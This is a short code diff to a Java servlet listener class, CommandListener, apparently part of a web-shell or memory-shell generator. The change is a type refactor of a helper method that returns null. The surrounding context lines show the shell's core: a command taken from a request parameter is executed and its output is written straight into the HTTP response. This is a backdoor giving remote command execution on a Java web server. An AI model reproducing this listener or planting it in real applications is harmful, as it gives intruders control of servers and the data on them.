@@ -35,7 +35,7 @@ public class CommandListener implements ServletRequestListener {
         try {
             String cmd = getParam(request.getParameter(paramName));
             if (cmd != null) {
-                HttpServletResponse servletResponse = this.getResponseFromRequest(request);
+                HttpServletResponse servletResponse = (HttpServletResponse) getResponseFromRequest(request);
                 InputStream inputStream = getInputStream(cmd);
                 ServletOutputStream outputStream = servletResponse.getOutputStream();
                 byte[] buf = new byte[8192];
@@ -48,7 +48,7 @@ public class CommandListener implements ServletRequestListener {
         }
     }
 
-    private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
+    private Object getResponseFromRequest(Object request) throws Exception {
         return null;
     }
 }
